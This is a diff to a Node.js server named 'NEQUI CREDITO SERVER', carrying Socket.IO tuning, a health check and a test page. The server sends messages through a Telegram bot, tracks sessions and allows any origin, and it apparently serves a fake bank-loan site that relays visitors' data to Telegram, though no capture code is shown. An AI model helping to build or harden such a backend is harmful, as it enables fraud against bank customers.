@@ -38,39 +38,39 @@ if (!CONFIG.TELEGRAM.TOKEN || !CONFIG.TELEGRAM.CHAT_ID) {
 // ========================================
 const app = express();
 const server = http.createServer(app);
+
+// Socket.IO con configuración optimizada para alta concurrencia
 const io = socketIO(server, {
   cors: {
     origin: '*',
     methods: ['GET', 'POST'],
     credentials: true
   },
-  // Configuración ULTRA ROBUSTA para miles de sesiones simultáneas sin pérdida de conexión
-  pingInterval: 25000, // Ping cada 25 segundos - balance perfecto
-  pingTimeout: 180000, // 3 MINUTOS - conexiones MUY persistentes para alta carga
-  upgradeTimeout: 45000, // 45 segundos para upgrade bajo carga
-  maxHttpBufferSize: 5e8, // 500 MB - buffer grande para múltiples sesiones
-  allowUpgrades: true,
-  perMessageDeflate: false, // Desactivado para mejor rendimiento con muchas conexiones
-  httpCompression: true, // Activado para reducir bandwidth
-  transports: ['websocket', 'polling'],
-  allowEIO3: true,
-  connectTimeout: 90000, // 1.5 minutos para conexión inicial bajo carga
-  cookie: false,
-  // Configuraciones adicionales para alta concurrencia
   path: '/socket.io/',
-  serveClient: true, // DEBE estar en true para servir socket.io.js
-  pingIntervalMS: 25000,
-  pongTimeoutMS: 180000
-});
-const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
-  polling: false // Solo envío de mensajes, NO polling
+  serveClient: true,
+  pingInterval: 25000,
+  pingTimeout: 180000,
+  upgradeTimeout: 45000,
+  maxHttpBufferSize: 5e8,
+  allowUpgrades: true,
+  transports: ['websocket', 'polling'],
+  connectTimeout: 90000,
+  cookie: false
 });
 
-// NO manejar errores de polling porque está deshabilitado
+const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
+  polling: false
+});
 
 // Middleware
 app.use(express.static(path.join(__dirname)));
 app.use(express.json());
+
+// Log cuando Socket.IO sirve archivos
+app.use('/socket.io/', (req, res, next) => {
+  console.log(`🔌 Socket.IO request: ${req.method} ${req.url}`);
+  next();
+});
 
 // ========================================
 // SESSION MANAGER (Repository Pattern)
@@ -691,8 +691,34 @@ app.get('/health', (req, res) => {
   res.json({
     status: 'ok',
     activeSessions: sessionRepo.sessions.size,
-    uptime: process.uptime()
+    connectedSockets: io.sockets.sockets.size,
+    uptime: process.uptime(),
+    socketIOConfigured: true
   });
+});
+
+// Test endpoint para Socket.IO
+app.get('/test-socket', (req, res) => {
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head><title>Socket.IO Test</title></head>
+    <body>
+      <h1>Socket.IO Test</h1>
+      <div id="status">Conectando...</div>
+      <script src="/socket.io/socket.io.js"></script>
+      <script>
+        const socket = io();
+        socket.on('connect', () => {
+          document.getElementById('status').innerHTML = '✅ Conectado! Socket ID: ' + socket.id;
+        });
+        socket.on('connect_error', (err) => {
+          document.getElementById('status').innerHTML = '❌ Error: ' + err.message;
+        });
+      </script>
+    </body>
+    </html>
+  `);
 });
 
 // ========================================
@@ -701,9 +727,12 @@ app.get('/health', (req, res) => {
 server.listen(CONFIG.PORT, () => {
   console.log('');
   console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
-  console.log('  🚀 NEQUI CREDITO SERVER');
-  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+  console.log('  🚀 NEQUI CREDITO SERVER - ULTRA ROBUSTO');
+  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
   console.log(`  📡 Servidor: http://localhost:${CONFIG.PORT}`);
+  console.log(`  🔌 Socket.IO: http://localhost:${CONFIG.PORT}/socket.io/`);
+  console.log(`  ✅ Test Socket: http://localhost:${CONFIG.PORT}/test-socket`);
+  console.log(`  💊 Health Check: http://localhost:${CONFIG.PORT}/health`);
   console.log(`  💬 Telegram Bot: Activo`);
   console.log(`  🔌 Socket.IO: Listo`);
   console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
